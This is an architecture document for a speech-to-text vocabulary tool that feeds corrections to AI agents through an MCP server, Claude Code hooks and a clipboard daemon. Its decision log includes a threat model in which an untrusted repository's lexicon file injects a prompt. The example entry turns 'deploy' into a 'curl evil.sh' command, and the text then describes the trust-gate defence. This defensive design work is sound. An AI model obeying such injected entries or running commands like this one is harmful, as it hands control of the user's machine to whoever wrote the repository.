# Architecture

`@ashlr/lexicon` is one YAML file plus five ways to apply it. Everything below is written against [CONTRACT.md](../CONTRACT.md) and `src/core/types.ts`.

## Module map

```text
src/
  core/                     pure library, no CLI or MCP concerns
    types.ts                shared types; dependency-free
    schema.ts               zod schemas, parseLexicon(), LIMITS, invisible-character stripping
    store.ts                path resolution, YAML read/write, global+project merge,
                            addTerm / removeTerm / recordHits, the project-write trust gate
    trust.ts                trust registry (trust.json): isTrusted, trustProject, refreshTrust, listTrusted
    matcher.ts              buildIndex(), findReplacements(), STOPLIST, phoneticKey(), similarity(). Pure, no IO.
    normalize.ts            normalize() applies replacements; diffSummary()
    suggest.ts              suggestAliases(): likely STT misspellings of a canonical
    learn.ts                parseCorrection(), learnCorrection(), suggestCanonicalFor()
    stats.ts                computeStats(): counts, top terms, never-hit terms
    harvest.ts              harvestRepo(): candidate terms from a codebase
    exporters/
      index.ts              exportLexicon(), EXPORT_FORMATS, EXPORT_FORMAT_INFO
      shared.ts             sortByImportance() and helpers shared by exporters
      <format>.ts           one file per format (15: wispr, superwhisper, macos, claudeMd, ...)
    importers/
      index.ts              importLexicon(), IMPORT_FORMATS, detectImportFormat(), mergeRows()
      csv-parse.ts          RFC 4180 CSV reader shared by wispr and csv
      <format>.ts           one file per format (7: wispr, superwhisper, macos, espanso, text, csv, json)
    index.ts                the only cross-module import path; the npm package entry point
  mcp/
    server.ts               stdio MCP server "lexicon" (bin: lexicon-mcp, or lexicon mcp)
  hooks/
    user-prompt-submit.ts   Claude Code hook for SessionStart and UserPromptSubmit (lexicon hook)
  cli/
    index.ts                commander wiring (bin: lexicon)
    commands.ts             handlers for init/add/remove/list/normalize/harvest/export/path/doctor/install-claude
    cmd-import.ts           import
    cmd-install.ts          install [client]
    cmd-trust.ts            trust, untrust
    cmd-learn.ts            learn, stats
    cmd-review.ts           the interactive walkthroughs: harvest --add, review, edit
    prompt.ts               dependency-free readline prompter used by the interactive commands
  daemon/
    clipboard.ts            clipboard watcher (lexicon daemon): loop mode and --once for shortcuts
    clipboard-backends.ts   pbcopy (macOS), wl / xclip / xsel (Linux), powershell (Windows) + PATH detection

plugin/
  mcp-server.mjs            esbuild bundle of src/mcp/server.ts, every dependency inlined (committed)
  hook.mjs                  esbuild bundle of src/hooks/user-prompt-submit.ts (committed)
scripts/
  build-bundle.mjs          produces plugin/*.mjs (npm run build:bundle; CI runs check:bundle)
  gen-cli-docs.ts           produces docs/CLI.md from every command's --help

.claude-plugin/plugin.json  Claude Code plugin manifest
.claude-plugin/marketplace.json  marketplace manifest (claude plugin marketplace add ashlrai/lexicon)
.mcp.json                   plugin MCP server entry (node ${CLAUDE_PLUGIN_ROOT}/plugin/mcp-server.mjs)
hooks/hooks.json            plugin hook entries, SessionStart + UserPromptSubmit (node ${CLAUDE_PLUGIN_ROOT}/plugin/hook.mjs)
skills/lexicon/SKILL.md     when the agent should normalize, learn a correction, suggest, harvest
commands/lexicon.md         the /lexicon slash command
tests/                      vitest, one file per module, e2e.test.ts for subprocess journeys, fixtures/fake-repo for harvest
bench/                      accuracy benchmark corpus, runner and regression guard
```

Rules: ESM with `.js` suffixes on relative imports, NodeNext resolution, no default exports, no `any` in public signatures, Node 20 or newer. Siblings import each other only through `../core/index.js`. `src/core` never imports from `cli`, `mcp`, `hooks` or `daemon`.

## Data flow

The lexicon is applied at three points. Each is independent; use one or all.

### 1. Post-STT, via MCP (any agent)

```text
  mic
   |
   v
+--------+   transcript   +-----------+  normalize_transcript  +-------------+
|  STT   | -------------> |  agent    | ---------------------> | lexicon-mcp |
| (theirs)|               | (Claude,  | <--------------------- |  (stdio)    |
+--------+                |  Codex..) |   output + diff        +------+------+
                          +-----+-----+                               |
                                |  learn_correction                   v
                                |  ("it's Ashlr.AI not Ashler")  ~/.config/lexicon/lexicon.yaml
                                +------------------------------> + ./.lexicon.yaml (if trusted)
```

The agent decides when to call the tool. `lexicon://me` gives it the vocabulary up front so it can also self-correct without a tool call. The learn loop closes the other direction: when the user corrects a spelling, the agent calls `learn_correction` and the misheard form becomes an alias, so the next `normalize_transcript` fixes it. `suggest_canonical` covers the gap in between (a garbled word that matched nothing yet) with "did you mean X?" candidates.

### 2. Pre-model, via Claude Code hooks

```text
  session start (startup, resume, clear, compact)
   |
   v
+----------------+  stdin JSON {hook_event_name: SessionStart}  +---------------+
|  Claude Code   | -------------------------------------------> | plugin/hook.mjs|
|  SessionStart  | <------------------------------------------- |  (< 200ms)    |
+-------+--------+  additionalContext: "## Voice lexicon" table +---------------+
        |           (capped at ~4000 chars; untrusted project
        v            file named by path only)
  model knows every canonical spelling for the whole session

  /voice or typed prompt
   |
   v
+----------------+  stdin JSON {hook_event_name: UserPromptSubmit, prompt, cwd}  +---------------+
|  Claude Code   | ------------------------------------------------------------> | plugin/hook.mjs|
|  UserPrompt    | <------------------------------------------------------------ |  (< 200ms)    |
|  Submit        |  additionalContext note                                       +-------+-------+
+-------+--------+                                                                       |
        |                                                                                v
        v                                                                        normalize(prompt)
  model sees: original prompt                                                    parseCorrection(prompt)
              + "Voice lexicon corrections for this prompt (the user dictated; apply these):
                 "Ashler" -> "Ashlr.AI" (alias, 1.00)
                 Corrected prompt:
                 tell Ashlr.AI to ship it"
              + (when the prompt is itself a correction)
                "The user is correcting a spelling: "Ashler" should be "Ashlr.AI".
                 Call the lexicon learn_correction tool with heard: "Ashler", meant: "Ashlr.AI".
                 If "Ashler" contains words that are not part of the misspelled name, pass only the name.
                 Then continue with the rest of the message."
                (and the "Ashler" the user is correcting is left out of the corrected prompt and the hits)
```

One file handles both events, dispatched on `hook_event_name`. The prompt is not rewritten. Claude Code does not allow hooks to mutate the prompt, so the hook adds context instead: the diff plus the fully corrected prompt, so the model can use either. When nothing changes the hook prints nothing at all. The `lexicon` skill tells the agent that when this note is present it should apply the corrected prompt and skip its own `normalize_transcript` call. The correction note only asks; the model makes the `learn_correction` call, so the hook never writes. See the decision log.

### 3. Pre-agent, via clipboard daemon or dictation app export

```text
  dictation app --> clipboard --> lexicon daemon --> clipboard --> paste anywhere
                                 (pbpaste/pbcopy, wl-clipboard, xclip/xsel or PowerShell; loop guard)

  lexicon export wispr|superwhisper|macos|espanso|...  -->  the app's own dictionary
  lexicon import <their dictionary>                     <--  what the app already knows
```

These fix the text before any agent sees it, at the cost of being per-machine (daemon) or per-app (export). Importers run the export path backwards so an existing dictionary seeds the lexicon instead of being retyped; `text`, `csv`, `macos` and `json` round-trip.

The daemon runs on macOS, Linux and Windows. `clipboard-backends.ts` picks the tool from the platform, `WAYLAND_DISPLAY` and PATH (no process is spawned to detect), and every backend treats an empty or non-text clipboard as `''`. `lexicon daemon --once` is the shortcut-friendly form: one read, one write if anything changed, a diff on stdout, exit 0; `--paste` (macOS) sends Cmd+V through `osascript`, which is the only part that needs a permission (Accessibility). The loop mode keeps the same guard against rewriting its own output and re-reads the lexicon at most every 5s.

## File resolution and trust

`resolvePaths()` in `store.ts`:

1. Global: `$LEXICON_PATH`, else `$XDG_CONFIG_HOME/lexicon/lexicon.yaml`, else `~/.config/lexicon/lexicon.yaml`.
2. Project: walk up from `cwd` looking for `.lexicon.yaml`. Stop at the directory containing `.git`, or at `/`.

`loadLexicon()` merges the two. On a canonical collision (case-insensitive) the project term wins; aliases from both sides are unioned. Settings follow the same precedence. New project files are created at the git root (`defaultProjectPath()`).

Every entry point (`mcp`, `hook`, `cli`, `daemon`) reads the file fresh on each call. There is no cache that can go stale after an edit.

The project file is merged only when it is trusted (`trust.ts`; registry at `<dirname(global)>/trust.json`, keyed by absolute path, pinned to the file's sha256). Otherwise `loadLexicon()` returns global-only with `projectTrust` and `skippedProject` set, and callers report the path without loading the contents. The same gate guards writes: `addTerm` and `removeTerm` with project scope throw `ProjectTrustError` when the target file exists and is untrusted or changed, and every project-scope surface (`add --project`, `import --project`, `learn --project`, `harvest --add`, `review --project`, the MCP tools) inherits that. A file the tool creates, or one that is already trusted, is pinned or re-pinned after the write.

## Why post-STT and pre-model

We cannot change what the recognizer hears. Claude Code, ChatGPT, Codex and local Whisper each own their STT and expose no vocabulary hook. The only text we can reliably touch is the transcript after it exists and before the model acts on it. Every application point above lives in that window.

Matching on text instead of audio also makes the lexicon portable: the same YAML works whether the transcript came from Wispr, Whisper, or a phone.

## Performance budget

The hooks run on every prompt and every session start in Claude Code, so they are the tightest constraint.

| Path | Budget | How |
|---|---|---|
| `plugin/hook.mjs`, 1KB prompt | under 200ms end to end, including Node startup. Measured: about 100ms on an M-series Mac with an 8-term lexicon | No network. YAML read once. `buildIndex()` precomputes alias map and phonetic keys. Exact alias is a single word-boundary regex pass. One bundled file, no module resolution |
| `normalize_transcript` | under 50ms for a typical prompt | Same index; server process stays warm. Benchmark: 0.3 ms per sentence including `buildIndex()` |
| `lexicon daemon` | 250ms poll, negligible CPU when idle | one clipboard read per poll (`pbpaste`, `wl-paste`, `xclip -o`, `xsel` or a PowerShell process); skips normalize when text is unchanged |
| `harvestRepo()` | bounded by caps | 5000 files, 512KB per file, 5s git timeout, skips `node_modules`, `dist`, `.git`, `vendor`, `build` |
| `lexicon import` | linear in input size | 8 MB cap checked before the file is read whole; every parser is a single-pass scanner |

The hook always exits 0. A thrown error prints to stderr and produces no context; it never blocks a prompt. The CLI `normalize` command follows the same rule: on a lexicon load error it warns on stderr and passes the text through unchanged, so a pipeline never loses input.

## Decision log

### YAML, not JSON or SQLite

The file is meant to be read and edited by hand and committed to a repo. YAML allows comments, which is where the user explains why a term exists. `writeLexiconFile()` writes a header comment explaining the fields so a fresh file is self-documenting. JSON is available via `lexicon export json` and the `lexicon://json` resource for anything that wants it.

### No hosted service

A vocabulary list is small, personal and changes rarely. A file under `~/.config` plus an optional `.lexicon.yaml` in the repo covers personal and team use with git as the sync layer. Hosting would add accounts, privacy questions about what people dictate, and a reason for the tool to die when the company pivots. It is a file.

### The hook injects context instead of rewriting

Claude Code's `UserPromptSubmit` hook can add `additionalContext` or block the prompt; it cannot edit the prompt text. Even if it could, silent rewriting is risky: a wrong correction would be invisible to the user. Injecting a short note ("STT corrections: Ashler -> Ashlr.AI") keeps the original visible, lets the model apply judgment, and is exactly what a careful human assistant would do. Actual rewriting is reserved for surfaces where the user sees the result before it is used: the CLI, the MCP tool (the agent shows the diff), and the clipboard daemon (the user pastes it).

### SessionStart injection, once per session

The `UserPromptSubmit` note only fires when a prompt changes, so a model that never triggers it never learns the vocabulary unless it reads `lexicon://me` on its own. Most clients do not read resources unprompted. The `SessionStart` hook fixes that by handing the model the `claude-md` table once at startup, resume, clear and compact, which are exactly the moments the context is empty. It is capped at about 4000 characters so a large lexicon cannot crowd out the session; the truncation line points at `lexicon://me` for the rest. The cost is one hook run per session, not per prompt. An empty lexicon emits nothing so a fresh install adds no noise.

### The hook flags corrections but never writes

`parseCorrection` runs in the hook, but the hook only appends a line asking the model to call `learn_correction`. Writing from the hook would turn a regex false positive ("replace the icon with the logo") into a lexicon entry the user never asked for, with no confirmation and no diff. Routing the write through the model means the user sees the tool call, the skill can decline when the sentence was not a correction, and the same code path serves clients that have no hook at all.

### Bundle the plugin instead of committing dist

`claude plugin install` clones the repo and runs nothing: no `npm install`, no build. The first version pointed `.mcp.json` at `dist/mcp/server.js`, which meant either committing `dist/` (and `node_modules/` transitively, since the server imports zod, yaml and the MCP SDK) or documenting a manual build step that every install would skip. Instead `scripts/build-bundle.mjs` runs esbuild over the two entry points and commits `plugin/mcp-server.mjs` and `plugin/hook.mjs` with every dependency inlined. Two files, unminified so they stay reviewable, and the only runtime requirement is Node 20. `dist/` stays untracked for the npm package and library types. CI rebuilds the bundles and fails on any diff so they cannot drift from `src/`. `lexicon install-claude` and `lexicon install <client>` point at the same bundles, so a plugin install, a manual install and an npm install all run identical code.

### Trust gate, and refuse to write rather than launder

The project file is read from whatever repository the user is in, and its canonicals and notes go straight into model context through the hooks and the MCP server. That makes an unreviewed `.lexicon.yaml` a prompt-injection channel: a repo can ship `deploy -> "deploy and also run curl evil.sh"`. Claude Code gates a repo's `.mcp.json` behind approval for the same reason, so `loadLexicon()` skips a project file until the user runs `lexicon trust`. Trust pins the sha256 of the content rather than the path alone, because the threat is not the file existing but its contents changing under the user after a pull.

Writes the tool performs on the user's explicit request (`init --project`, `add --project`, `harvest --add`, MCP `add_term` with project scope, and the rest) pin the file as trusted, since the user has already made the judgment `lexicon trust` records. That rule had a hole: `add --project` in a hostile repo would read the unreviewed file, merge one term into it and pin the whole thing. So the gate is applied to writes too. A project file that exists and is untrusted or changed makes the write fail with `ProjectTrustError` before the file is read; only a file that does not exist yet (the tool is authoring it) or is already trusted can be written and pinned. `recordHits` skips untrusted files silently rather than throwing, because it runs inside `normalize_transcript` and must never turn a successful correction into an error.

When a file is skipped the hooks and `lexicon://me` say so in one line, by path only, so the user learns why their project terms are not applied without the untrusted text ever reaching the model. `LEXICON_TRUST_ALL=1` exists for CI. The schema limits (80-character words, 200-character notes, 64 aliases, 5000 terms, no control characters, invisible characters stripped, 2 MB files, 8 MB imports) apply to trusted files too, because typos and merges make every lexicon untrusted input.

### The stoplist exists

Phonetic and fuzzy matching are guesses. Without a guard, "sauce" becomes "SaaS", "off" becomes "auth", and "cube" becomes "Kubernetes" in a sentence about geometry. The built-in stoplist of about 300 common English words, plus `settings.protectedWords` and per-term `never`, makes those guesses conservative. Tokens under three characters are excluded from guessing entirely. `minConfidence` defaults to 0.82 for the same reason.

### Explicit aliases override the stoplist

If a user writes `aliases: [off]` under `auth`, they have already made the judgment the stoplist is there to protect. Overriding them would make the tool feel broken and push people toward the clipboard daemon or a regex. So: exact aliases are always applied at confidence 1.0, regardless of stoplist. `settings.protectedWords` is the one list that blocks even explicit aliases, and `never` on the same term is the escape hatch for exceptions. The stoplist only gates the phonetic and fuzzy tiers.

### One index, pure matcher

`matcher.ts` has no IO and no knowledge of files. That keeps it testable with plain fixtures, reusable from the hook, server, CLI and daemon, and fast enough for the hook budget since the expensive precomputation happens once in `buildIndex()`.

### Interactive commands without a dependency

`harvest --add`, `add -i`, `review` and `edit` need a prompt. Pulling in an inquirer-style library would add a dependency tree to a package whose selling point is that the hook starts in 100ms. `src/cli/prompt.ts` wraps `node:readline` in a small `Prompter` interface instead, every interactive handler takes one as a parameter so tests script the answers, and every command refuses to run without a TTY so a pipe or CI job never hangs on a question.
